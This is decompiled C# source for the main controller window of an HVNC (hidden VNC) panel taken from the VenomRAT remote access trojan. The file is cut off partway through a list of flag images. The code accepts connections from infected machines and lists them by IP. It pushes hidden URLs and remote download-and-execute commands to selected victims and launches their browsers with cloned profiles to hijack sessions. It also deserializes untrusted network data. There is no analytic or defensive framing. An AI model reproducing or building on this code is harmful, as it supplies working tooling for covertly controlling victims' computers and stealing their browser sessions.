// Decompiled with JetBrains decompiler
// Type: HVNC.FrmMain
// Assembly: HVNC + HVNC, Version=5.0.5.0, Culture=neutral, PublicKeyToken=null
// MVID: E1695EF8-D969-4A67-9689-1BFF511518E7
// Assembly location: C:\Users\User\Downloads\VenomRAT-V5.6-HVNC\VenomRAT-V5.6-HVNC\HVNC + HVNC.exe


using Siticone.Desktop.UI.WinForms;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;




namespace HVNC
{
  public class FrmMain : Form
  {
    public static List<TcpClient> _clientList;
    public static TcpListener _TcpListener;
    private Thread VNC_Thread;
    public static int SelectClient;
    public static bool bool_1;
    public static int int_2;
    public static string isadmin;
    public static string detecav;
    public static Random random = new Random();
    public int count;
    public static bool ispressed = false;
    private IContainer components;
    private ImageList imageList1;
    private ContextMenuStrip contextMenuStrip1;
    private ToolStripMenuItem testToolStripMenuItem;
    private Panel panel1;
    private Label label3;
    public ToolStripMenuItem HVNCListenBtn;
    private ToolStripMenuItem portToolStripMenuItem;
    private ToolStripTextBox HVNCListenPort;
    private ToolStripSeparator toolStripSeparator3;
    private ImageList imageList2;
    private ColumnHeader columnHeader3;
    private PictureBox pictureBox1;
    public ListView HVNCList;
    private ColumnHeader columnHeader1;
    private ToolStripMenuItem builderToolStripMenuItem;
    public Label PortStatus;
    private ToolStripMenuItem optionsToolStripMenuItem;
    private ToolStripMenuItem remoteExecuteToolStripMenuItem;
    private ToolStripMenuItem closeConnectionToolStripMenuItem;
    private SiticoneGradientPanel siticoneGradientPanel4;
    //    private Panel siticoneGradientPanel4;
        private SiticoneBorderlessForm siticoneBorderlessForm1;
    private SiticoneDragControl siticoneDragControl1;
    private SiticoneGradientPanel siticoneGradientPanel1;
    private Label ClientsOnline;
    private SiticoneToggleSwitch TogglePort;
    private SiticoneNumericUpDown hvncport;
    private SiticoneControlBox siticoneControlBox3;

    public FrmMain() => this.InitializeComponent();

    public static int portvalue { get; set; }

    public void Listenning()
    {
      try
      {
        FrmMain._clientList = new List<TcpClient>();
        FrmMain._TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(this.hvncport.Value));
        FrmMain._TcpListener.Start();
        FrmMain._TcpListener.BeginAcceptTcpClient(new AsyncCallback(this.ResultAsync), (object) FrmMain._TcpListener);
      }
      catch (Exception ex1)
      {
        try
        {
          if (ex1.Message.Contains("aborted"))
            return;
          IEnumerator enumerator = (IEnumerator) null;
          while (true)
          {
            try
            {
              try
              {
                foreach (Form openForm in (ReadOnlyCollectionBase) Application.OpenForms)
                {
                  if (openForm.Name.Contains("FrmVNC"))
                    openForm.Dispose();
                }
                break;
              }
              finally
              {
                if (enumerator is IDisposable)
                  (enumerator as IDisposable).Dispose();
              }
            }
            catch (Exception ex2)
            {
            }
          }
          FrmMain.bool_1 = false;
          this.HVNCListenBtn.Text = "Listen";
          int num = checked (FrmMain._clientList.Count - 1);
          int index = 0;
          while (index <= num)
          {
            FrmMain._clientList[index].Close();
            checked { ++index; }
          }
          FrmMain._clientList = new List<TcpClient>();
          FrmMain.int_2 = 0;
          FrmMain._TcpListener.Stop();
          this.ClientsOnline.Text = "Client in HVNC Panel: 0";
        }
        catch (Exception ex3)
        {
        }
      }
    }

    public static string RandomNumber(int length) => new string(Enumerable.Repeat<string>("0123456789", length).Select<string, char>((Func<string, char>) (s => s[FrmMain.random.Next(s.Length)])).ToArray<char>());

    public void ResultAsync(IAsyncResult iasyncResult_0)
    {
      try
      {
        TcpClient state = ((TcpListener) iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
        state.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(this.ReadResult), (object) state);
        FrmMain._TcpListener.BeginAcceptTcpClient(new AsyncCallback(this.ResultAsync), (object) FrmMain._TcpListener);
      }
      catch (Exception ex)
      {
      }
    }

    public void ReadResult(IAsyncResult iasyncResult_0)
    {
      TcpClient tcpClient = (TcpClient) iasyncResult_0.AsyncState;
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
        binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
        binaryFormatter.FilterLevel = TypeFilterLevel.Full;
        byte[] buffer1 = new byte[8];
        int count = 8;
        int offset1 = 0;
        while (count > 0)
        {
          int num = tcpClient.GetStream().Read(buffer1, offset1, count);
          checked { count -= num; }
          checked { offset1 += num; }
        }
        ulong uint64 = BitConverter.ToUInt64(buffer1, 0);
        byte[] buffer2 = new byte[checked (Convert.ToInt32(Decimal.Subtract(new Decimal(uint64), 1M)) + 1)];
        using (MemoryStream serializationStream = new MemoryStream())
        {
          int offset2 = 0;
          int length = buffer2.Length;
          while (length > 0)
          {
            int num = tcpClient.GetStream().Read(buffer2, offset2, length);
            checked { length -= num; }
            checked { offset2 += num; }
          }
          serializationStream.Write(buffer2, 0, checked ((int) uint64));
          serializationStream.Position = 0L;
          object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize((Stream) serializationStream));
          if (objectValue is string)
          {
            string[] strArray = (string[]) NewLateBinding.LateGet(objectValue, (System.Type) null, "split", new object[1]
            {
              (object) "|"
            }, (string[]) null, (System.Type[]) null, (bool[]) null);
            try
            {
              if (Operators.CompareString(strArray[0], "54321", false) == 0)
                tcpClient.Close();
              if (Operators.CompareString(strArray[0], "754321", false) == 0)
              {
                string str;
                try
                {
                  str = ((IPEndPoint) tcpClient.Client.RemoteEndPoint).Address.ToString();
                }
                catch
                {
                  str = ((IPEndPoint) tcpClient.Client.RemoteEndPoint).Address.ToString();
                }
                try
                {
                  ListViewItem lvi = new ListViewItem(new string[1]
                  {
                    " " + str
                  })
                  {
                    Tag = (object) tcpClient
                  };
                  this.HVNCList.Invoke(new MethodInvoker(delegate ()
                  {
                    lock (FrmMain._clientList)
                    {
                      this.HVNCList.Items.Add(lvi);
                      this.HVNCList.Items[FrmMain.int_2].Selected = true;
                      FrmMain._clientList.Add(tcpClient);
                      checked { ++FrmMain.int_2; }
                      this.ClientsOnline.Text = "Client in HVNC Panel: " + Conversions.ToString(FrmMain.int_2);
                      GC.Collect();
                    }
                  }));
                }
                catch (Exception ex)
                {
                }
              }
              else if (FrmMain._clientList.Contains(tcpClient))
                this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
              else
                tcpClient.Close();
            }
            catch (Exception ex)
            {
            }
          }
          else if (FrmMain._clientList.Contains(tcpClient))
            this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
          else
            tcpClient.Close();
          serializationStream.Close();
          serializationStream.Dispose();
        }
        tcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(this.ReadResult), (object) tcpClient);
      }
      catch (Exception ex1)
      {
        if (!ex1.Message.Contains("disposed"))
        {
          try
          {
            if (!FrmMain._clientList.Contains(tcpClient))
              return;
            int NumberReceived = checked (Application.OpenForms.Count - 2);
            while (NumberReceived >= 0)
            {
              if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
              {
                if (Application.OpenForms[NumberReceived].Visible)
                  this.Invoke(new MethodInvoker(delegate ()
                  {
                    if (!Application.OpenForms[NumberReceived].IsHandleCreated)
                      return;
                    Application.OpenForms[NumberReceived].Close();
                  }));
                else if (Application.OpenForms[NumberReceived].IsHandleCreated)
                  Application.OpenForms[NumberReceived].Close();
              }
              checked { NumberReceived += -1; }
            }
            this.HVNCList.Invoke(new MethodInvoker(delegate ()
            {
                {
                    lock (FrmMain._clientList)
                    {
                        try
                        {
                            int index = FrmMain._clientList.IndexOf(tcpClient);
                            FrmMain._clientList.RemoveAt(index);
                            this.HVNCList.Items.RemoveAt(index);
                            tcpClient.Close();
                            checked { --FrmMain.int_2; }
                            this.ClientsOnline.Text = "Client in HVNC Panel: " + Conversions.ToString(FrmMain.int_2);
                        }
                        catch (Exception ex2)
                        {
                        }
                    }
                }
            }));
          }
          catch (Exception ex3)
          {
          }
        }
        else
          tcpClient.Close();
      }
    }

    public void GetStatus(object object_2, TcpClient tcpClient_0)
    {
      FrmVNC openForm = (FrmVNC) Application.OpenForms["VNCForm:" + Conversions.ToString(tcpClient_0.GetHashCode())];
      switch (object_2)
      {
        case Bitmap _:
          openForm.VNCBoxe.Image = (Image) object_2;
          break;
        case string _:
          string[] strArray = Conversions.ToString(object_2).Split('|');
          string Left = strArray[0];
          if (Operators.CompareString(Left, "0", false) == 0)
            openForm.VNCBoxe.Tag = (object) new Size(Conversions.ToInteger(strArray[1]), Conversions.ToInteger(strArray[2]));
          if (Operators.CompareString(Left, "200", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated with cloned profile successfully!";
          if (Operators.CompareString(Left, "201", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated successfully!";
          if (Operators.CompareString(Left, "202", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated with cloned profile successfully!";
          if (Operators.CompareString(Left, "203", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated successfully!";
          if (Operators.CompareString(Left, "204", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = "Edge initiated with cloned profile successfully!";
          if (Operators.CompareString(Left, "205", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = "Edge initiated successfully!";
          if (Operators.CompareString(Left, "206", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = "Brave initiated with cloned profile successfully!";
          if (Operators.CompareString(Left, "207", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
          if (Operators.CompareString(Left, "256", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
          if (Operators.CompareString(Left, "22", false) == 0)
          {
            openForm.FrmTransfer0.int_0 = Conversions.ToInteger(strArray[1]);
            openForm.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(strArray[1]);
          }
          if (Operators.CompareString(Left, "23", false) == 0)
            openForm.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(strArray[1]));
          if (Operators.CompareString(Left, "25", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = strArray[1];
          if (Operators.CompareString(Left, "26", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = strArray[1];
          if (Operators.CompareString(Left, "2555", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = strArray[1];
          if (Operators.CompareString(Left, "2556", false) == 0)
            openForm.FrmTransfer0.FileTransferLabele.Text = strArray[1];
          if (Operators.CompareString(Left, "2557", false) != 0)
            break;
          openForm.FrmTransfer0.FileTransferLabele.Text = strArray[1];
          break;
      }
    }

    private void HVNCList_DoubleClick(object sender, EventArgs e)
    {
      try
      {
        if (this.HVNCList.SelectedItems.Count == 0)
        {
          int num = (int) MessageBox.Show("You have to select a client first!", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          if (this.HVNCList.FocusedItem.Index == -1)
            return;
          int index = checked (Application.OpenForms.Count - 1);
          while (index >= 0)
          {
            if (Application.OpenForms[index].Tag != FrmMain._clientList[this.HVNCList.FocusedItem.Index])
            {
              checked { index += -1; }
            }
            else
            {
              Application.OpenForms[index].Show();
              return;
            }
          }
          FrmVNC frmVnc = new FrmVNC();
          frmVnc.Name = "VNCForm:" + Conversions.ToString(FrmMain._clientList[this.HVNCList.FocusedItem.Index].GetHashCode());
          frmVnc.Tag = (object) FrmMain._clientList[this.HVNCList.FocusedItem.Index];
          this.HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", (string) null).Replace("{", (string) null).Replace("}", (string) null).Replace(":", (string) null).Remove(0, 1);
          frmVnc.Show();
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("You have to select a client first!", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e) => e.DrawDefault = true;

    private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
    {
      if (e.Item.Selected)
        return;
      e.DrawDefault = true;
    }

    private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
    {
      if (e.Item.Selected)
      {
        e.Graphics.FillRectangle((Brush) new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
        Graphics graphics = e.Graphics;
        string text = e.SubItem.Text;
        Font font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point);
        Rectangle bounds = e.Bounds;
        int x = checked (bounds.Left + 3);
        bounds = e.Bounds;
        int y = checked (bounds.Top + 2);
        Point pt = new Point(x, y);
        Color white = Color.White;
        TextRenderer.DrawText((IDeviceContext) graphics, text, font, pt, white);
      }
      else
        e.DrawDefault = true;
    }

    public void HVNCListenBtn_Click_1(object sender, EventArgs e)
    {
      FrmBuilder frmBuilder = new FrmBuilder();
      if (Operators.CompareString(this.PortStatus.Text, "Listening Port", false) == 0)
      {
        this.PortStatus.Text = "Disable Port";
        this.HVNCListenBtn.Image = this.imageList2.Images[0];
        this.HVNCListenPort.Enabled = false;
        this.VNC_Thread = new Thread(new ThreadStart(this.Listenning))
        {
          IsBackground = true
        };
        FrmMain.bool_1 = true;
        this.VNC_Thread.Start();
      }
      else
      {
        IEnumerator enumerator = (IEnumerator) null;
        while (true)
        {
          try
          {
            try
            {
              foreach (Form openForm in (ReadOnlyCollectionBase) Application.OpenForms)
              {
                if (openForm.Name.Contains("FrmVNC"))
                  openForm.Dispose();
              }
              break;
            }
            finally
            {
              if (enumerator is IDisposable)
                (enumerator as IDisposable).Dispose();
            }
          }
          catch (Exception ex)
          {
          }
        }
        this.HVNCListenPort.Enabled = true;
        this.VNC_Thread.Abort();
        FrmMain.bool_1 = false;
        this.PortStatus.Text = "Start Port";
        this.HVNCListenBtn.Image = this.imageList2.Images[1];
        this.HVNCList.Items.Clear();
        FrmMain._TcpListener.Stop();
        int num = checked (FrmMain._clientList.Count - 1);
        int index = 0;
        while (index <= num)
        {
          FrmMain._clientList[index].Close();
          checked { ++index; }
        }
        FrmMain._clientList = new List<TcpClient>();
        FrmMain.int_2 = 0;
        this.ClientsOnline.Text = "Client in HVNC Panel: 0";
      }
    }

    public void StartStopPort()
    {
      FrmBuilder frmBuilder = new FrmBuilder();
      if (Operators.CompareString(this.PortStatus.Text, "Start Port", false) == 0)
      {
        this.PortStatus.Text = "Disable Port";
        this.HVNCListenBtn.Image = this.imageList2.Images[0];
        this.HVNCListenPort.Enabled = false;
        this.VNC_Thread = new Thread(new ThreadStart(this.Listenning))
        {
          IsBackground = true
        };
        FrmMain.bool_1 = true;
        this.VNC_Thread.Start();
      }
      else
      {
        IEnumerator enumerator = (IEnumerator) null;
        while (true)
        {
          try
          {
            try
            {
              foreach (Form openForm in (ReadOnlyCollectionBase) Application.OpenForms)
              {
                if (openForm.Name.Contains("FrmVNC"))
                  openForm.Dispose();
              }
              break;
            }
            finally
            {
              if (enumerator is IDisposable)
                (enumerator as IDisposable).Dispose();
            }
          }
          catch (Exception ex)
          {
          }
        }
        this.HVNCListenPort.Enabled = true;
        this.VNC_Thread.Abort();
        FrmMain.bool_1 = false;
        this.PortStatus.Text = "Start Port";
        this.HVNCListenBtn.Image = this.imageList2.Images[1];
        this.HVNCList.Items.Clear();
        FrmMain._TcpListener.Stop();
        int num = checked (FrmMain._clientList.Count - 1);
        int index = 0;
        while (index <= num)
        {
          FrmMain._clientList[index].Close();
          checked { ++index; }
        }
        FrmMain._clientList = new List<TcpClient>();
        FrmMain.int_2 = 0;
        this.ClientsOnline.Text = "Clients Online: 0";
      }
    }

    private void FrmMain_Load(object sender, EventArgs e)
    {
      this.HVNCList.View = View.Details;
      this.HVNCList.HideSelection = false;
      this.HVNCList.OwnerDraw = true;
      this.HVNCList.BackColor = Color.FromArgb(24, 24, 24);
      this.HVNCList.BackColor = Color.FromArgb(27, 27, 27);
      this.HVNCList.DrawColumnHeader += (DrawListViewColumnHeaderEventHandler) ((sender1, args) =>
      {
        Brush brush = (Brush) new SolidBrush(Color.FromArgb(36, 36, 36));
        args.Graphics.FillRectangle(brush, args.Bounds);
        TextRenderer.DrawText((IDeviceContext) args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
      });
      this.HVNCList.DrawItem += (DrawListViewItemEventHandler) ((sender1, args) => args.DrawDefault = true);
      this.HVNCList.DrawSubItem += (DrawListViewSubItemEventHandler) ((sender1, args) => args.DrawDefault = true);
      this.ClientsOnline.Text = "Client in HVNC Panel: 0";
    }

    private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
    {
    }

    public static string saveurl { get; set; }

    private void visitURLToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.HVNCList.SelectedItems.Count == 0)
        {
          int num1 = (int) MessageBox.Show("You have to select a client first! ", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          int num2 = (int) new FrmURL().ShowDialog();
          if (!FrmMain.ispressed)
            return;
          FrmVNC frmVnc = new FrmVNC();
          foreach (object selectedItem in this.HVNCList.SelectedItems)
            this.count = this.HVNCList.SelectedItems.Count;
          for (int index = 0; index < this.count; ++index)
          {
            frmVnc.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
            object tag = this.HVNCList.SelectedItems[index].Tag;
            frmVnc.Tag = tag;
            frmVnc.hURL(FrmMain.saveurl);
            frmVnc.Dispose();
          }
          int num3 = (int) MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
          FrmMain.ispressed = false;
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
        this.Close();
      }
    }

    private void killChromeToolStripMenuItem_Click(object sender, EventArgs e)
    {
      FrmVNC frmVnc = new FrmVNC();
      foreach (object selectedItem in this.HVNCList.SelectedItems)
        this.count = this.HVNCList.SelectedItems.Count;
      for (int index = 0; index < this.count; ++index)
      {
        frmVnc.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
        object tag = this.HVNCList.SelectedItems[index].Tag;
        frmVnc.Tag = tag;
        frmVnc.KillChrome();
        frmVnc.Dispose();
      }
      int num = (int) MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void resetScaleToolStripMenuItem_Click(object sender, EventArgs e)
    {
      FrmVNC frmVnc = new FrmVNC();
      foreach (object selectedItem in this.HVNCList.SelectedItems)
        this.count = this.HVNCList.SelectedItems.Count;
      for (int index = 0; index < this.count; ++index)
      {
        frmVnc.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
        object tag = this.HVNCList.SelectedItems[index].Tag;
        frmVnc.Tag = tag;
        frmVnc.ResetScale();
        frmVnc.Dispose();
      }
      int num = (int) MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static string MassURL { get; set; }

    private void builderToolStripMenuItem_Click(object sender, EventArgs e)
    {
      int num = (int) new FrmBuilder().ShowDialog();
    }

    private void TogglePort_Click(object sender, EventArgs e) => this.HVNCListenBtn.PerformClick();

    private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.HVNCList.SelectedItems.Count == 0)
        {
          int num1 = (int) MessageBox.Show("You have to select a client first! ", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          int num2 = (int) new FrmMassUpdate().ShowDialog();
          if (!FrmMain.ispressed)
            return;
          FrmVNC frmVnc = new FrmVNC();
          foreach (object selectedItem in this.HVNCList.SelectedItems)
            this.count = this.HVNCList.SelectedItems.Count;
          for (int index = 0; index < this.count; ++index)
          {
            frmVnc.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
            object tag = this.HVNCList.SelectedItems[index].Tag;
            frmVnc.Tag = tag;
            frmVnc.UpdateClient(FrmMain.MassURL);
            frmVnc.Dispose();
          }
          int num3 = (int) MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
          FrmMain.ispressed = false;
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("An Error Has Occured", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.Close();
      }
    }

    private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
    {
      this.HVNCListenBtn.PerformClick();
      Thread.Sleep(500);
    }

    private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.HVNCList.SelectedItems.Count == 0)
        {
          int num1 = (int) MessageBox.Show("You have to select a client first! ", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          if (MessageBox.Show("Are you sure you want to close the connection?", "HVNC", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
            return;
          FrmVNC frmVnc = new FrmVNC();
          foreach (object selectedItem in this.HVNCList.SelectedItems)
            this.count = this.HVNCList.SelectedItems.Count;
          for (int index = 0; index < this.count; ++index)
          {
            frmVnc.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
            object tag = this.HVNCList.SelectedItems[index].Tag;
            frmVnc.Tag = tag;
            frmVnc.CloseClient();
            frmVnc.Dispose();
          }
          int num2 = (int) MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("An Error Has Occured", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.Close();
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FrmMain));
      this.imageList1 = new ImageList(this.components);
          
            this.contextMenuStrip1 = new ContextMenuStrip(this.components);
      this.testToolStripMenuItem = new ToolStripMenuItem();
      this.builderToolStripMenuItem = new ToolStripMenuItem();
      this.optionsToolStripMenuItem = new ToolStripMenuItem();
      this.remoteExecuteToolStripMenuItem = new ToolStripMenuItem();
      this.closeConnectionToolStripMenuItem = new ToolStripMenuItem();
      this.panel1 = new Panel();
      this.siticoneControlBox3 = new SiticoneControlBox();
      this.pictureBox1 = new PictureBox();
      this.label3 = new Label();
      this.PortStatus = new Label();
      this.imageList2 = new ImageList(this.components);
      this.HVNCList = new ListView();
      this.columnHeader3 = new ColumnHeader();
      this.columnHeader1 = new ColumnHeader();
      this.HVNCListenBtn = new ToolStripMenuItem();
      this.portToolStripMenuItem = new ToolStripMenuItem();
      this.HVNCListenPort = new ToolStripTextBox();
      this.toolStripSeparator3 = new ToolStripSeparator();
      this.siticoneGradientPanel4 = new SiticoneGradientPanel();
     //       this.siticoneGradientPanel4 = new Panel();
            this.hvncport = new SiticoneNumericUpDown();
      this.TogglePort = new SiticoneToggleSwitch();
      this.siticoneBorderlessForm1 = new SiticoneBorderlessForm(this.components);
      this.siticoneDragControl1 = new SiticoneDragControl(this.components);
      this.siticoneGradientPanel1 = new SiticoneGradientPanel();
      this.ClientsOnline = new Label();
      this.contextMenuStrip1.SuspendLayout();
      this.panel1.SuspendLayout();
         
            ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.siticoneGradientPanel4.SuspendLayout();
      this.hvncport.BeginInit();
      this.siticoneGradientPanel1.SuspendLayout();
      this.SuspendLayout();
      this.imageList1.ImageStream = (ImageListStreamer) componentResourceManager.GetObject("imageList1.ImageStream");
      this.imageList1.TransparentColor = Color.Black;
      this.imageList1.Images.SetKeyName(0, "ad.png");
      this.imageList1.Images.SetKeyName(1, "ae.png");
      this.imageList1.Images.SetKeyName(2, "af.png");
      this.imageList1.Images.SetKeyName(3, "ag.png");
      this.imageList1.Images.SetKeyName(4, "ai.png");
      this.imageList1.Images.SetKeyName(5, "al.png");
      this.imageList1.Images.SetKeyName(6, "am.png");
      this.imageList1.Images.SetKeyName(7, "an.png");
      this.imageList1.Images.SetKeyName(8, "ao.png");
      this.imageList1.Images.SetKeyName(9, "ar.png");
      this.imageList1.Images.SetKeyName(10, "as.png");
      this.imageList1.Images.SetKeyName(11, "at.png");
      this.imageList1.Images.SetKeyName(12, "au.png");
      this.imageList1.Images.SetKeyName(13, "aw.png");
      this.imageList1.Images.SetKeyName(14, "ax.png");
      this.imageList1.Images.SetKeyName(15, "az.png");
      this.imageList1.Images.SetKeyName(16, "ba.png");
      this.imageList1.Images.SetKeyName(17, "bb.png");
      this.imageList1.Images.SetKeyName(18, "bd.png");
      this.imageList1.Images.SetKeyName(19, "be.png");
      this.imageList1.Images.SetKeyName(20, "bf.png");
      this.imageList1.Images.SetKeyName(21, "bg.png");
      this.imageList1.Images.SetKeyName(22, "bh.png");
      this.imageList1.Images.SetKeyName(23, "bi.png");
      this.imageList1.Images.SetKeyName(24, "bj.png");
      this.imageList1.Images.SetKeyName(25, "bm.png");
      this.imageList1.Images.SetKeyName(26, "bn.png");
      this.imageList1.Images.SetKeyName(27, "bo.png");
      this.imageList1.Images.SetKeyName(28, "br.png");
      this.imageList1.Images.SetKeyName(29, "bs.png");
      this.imageList1.Images.SetKeyName(30, "bt.png");
      this.imageList1.Images.SetKeyName(31, "bv.png");
      this.imageList1.Images.SetKeyName(32, "bw.png");
      this.imageList1.Images.SetKeyName(33, "by.png");
      this.imageList1.Images.SetKeyName(34, "bz.png");
      this.imageList1.Images.SetKeyName(35, "ca.png");
      this.imageList1.Images.SetKeyName(36, "catalonia.png");
      this.imageList1.Images.SetKeyName(37, "cc.png");
      this.imageList1.Images.SetKeyName(38, "cd.png");
      this.imageList1.Images.SetKeyName(39, "cf.png");
      this.imageList1.Images.SetKeyName(40, "cg.png");
      this.imageList1.Images.SetKeyName(41, "ch.png");
      this.imageList1.Images.SetKeyName(42, "ci.png");
      this.imageList1.Images.SetKeyName(43, "ck.png");
      this.imageList1.Images.SetKeyName(44, "cl.png");
      this.imageList1.Images.SetKeyName(45, "cm.png");
      this.imageList1.Images.SetKeyName(46, "cn.png");
      this.imageList1.Images.SetKeyName(47, "co.png");
      this.imageList1.Images.SetKeyName(48, "cr.png");
      this.imageList1.Images.SetKeyName(49, "cs.png");
      this.imageList1.Images.SetKeyName(50, "cu.png");
      this.imageList1.Images.SetKeyName(51, "cv.png");
      this.imageList1.Images.SetKeyName(52, "cx.png");
      this.imageList1.Images.SetKeyName(53, "cy.png");
      this.imageList1.Images.SetKeyName(54, "cz.png");
      this.imageList1.Images.SetKeyName(55, "de.png");
      this.imageList1.Images.SetKeyName(56, "dj.png");
      this.imageList1.Images.SetKeyName(57, "dk.png");
      this.imageList1.Images.SetKeyName(58, "dm.png");
      this.imageList1.Images.SetKeyName(59, "do.png");
      this.imageList1.Images.SetKeyName(60, "dz.png");
      this.imageList1.Images.SetKeyName(61, "ec.png");
      this.imageList1.Images.SetKeyName(62, "ee.png");
      this.imageList1.Images.SetKeyName(63, "eg.png");
      this.imageList1.Images.SetKeyName(64, "eh.png");
      this.imageList1.Images.SetKeyName(65, "england.png");
      this.imageList1.Images.SetKeyName(66, "er.png");
      this.imageList1.Images.SetKeyName(67, "es.png");
      this.imageList1.Images.SetKeyName(68, "et.png");
      this.imageList1.Images.SetKeyName(69, "europeanunion.png");
      this.imageList1.Images.SetKeyName(70, "fam.png");
      this.imageList1.Images.SetKeyName(71, "fi.png");
      this.imageList1.Images.SetKeyName(72, "fj.png");
      this.imageList1.Images.SetKeyName(73, "fk.png");
      this.imageList1.Images.SetKeyName(74, "fm.png");
      this.imageList1.Images.SetKeyName(75, "fo.png");
      this.imageList1.Images.SetKeyName(76, "fr.png");
      this.imageList1.Images.SetKeyName(77, "ga.png");
      this.imageList1.Images.SetKeyName(78, "gb.png");
      this.imageList1.Images.SetKeyName(79, "gd.png");
      this.imageList1.Images.SetKeyName(80, "ge.png");
      this.imageList1.Images.SetKeyName(81, "gf.png");
      this.imageList1.Images.SetKeyName(82, "gh.png");
      this.imageList1.Images.SetKeyName(83, "gi.png");
      this.imageList1.Images.SetKeyName(84, "gl.png");
      this.imageList1.Images.SetKeyName(85, "gm.png");
      this.imageList1.Images.SetKeyName(86, "gn.png");
      this.imageList1.Images.SetKeyName(87, "gp.png");
      this.imageList1.Images.SetKeyName(88, "gq.png");
      this.imageList1.Images.SetKeyName(89, "gr.png");
      this.imageList1.Images.SetKeyName(90, "gs.png");
      this.imageList1.Images.SetKeyName(91, "gt.png");
      this.imageList1.Images.SetKeyName(92, "gu.png");
      this.imageList1.Images.SetKeyName(93, "gw.png");
      this.imageList1.Images.SetKeyName(94, "gy.png");
      this.imageList1.Images.SetKeyName(95, "hk.png");
      this.imageList1.Images.SetKeyName(96, "hm.png");
      this.imageList1.Images.SetKeyName(97, "hn.png");
      this.imageList1.Images.SetKeyName(98, "hr.png");
      this.imageList1.Images.SetKeyName(99, "ht.png");
